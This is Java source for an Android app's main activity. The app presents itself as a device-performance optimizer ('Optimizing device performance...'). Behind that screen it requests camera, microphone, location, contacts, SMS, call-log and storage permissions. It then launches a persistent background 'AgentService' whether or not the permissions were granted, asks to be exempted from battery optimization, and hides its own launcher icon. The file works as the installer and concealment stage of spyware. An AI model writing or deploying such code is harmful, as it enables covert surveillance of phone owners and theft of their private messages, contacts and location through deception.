package com.devicehealth.service;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERM_REQUEST = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView tv = new TextView(this);
        tv.setText("Optimizing device performance...");
        tv.setTextSize(16);
        tv.setPadding(64, 128, 64, 64);
        setContentView(tv);

        requestPermissions();
    }

    private void requestPermissions() {
        List<String> needed = new ArrayList<>();

        String[] dangerous = {
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.SEND_SMS",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_PHONE_STATE",
        };

        for (String perm : dangerous) {
            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            requestPermissions(needed.toArray(new String[0]), PERM_REQUEST);
        } else {
            launchService();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] perms, int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);
        // Start service regardless of permission results
        launchService();
    }

    private void launchService() {
        // Request battery optimization exemption
        requestBatteryExemption();

        // Start the foreground service
        Intent svc = new Intent(this, AgentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        // Hide from launcher after a short delay
        getWindow().getDecorView().postDelayed(() -> {
            hideLauncher();
            finish();
        }, 2000);
    }

    private void requestBatteryExemption() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        } catch (Exception ignored) {}
    }

    private void hideLauncher() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }
}
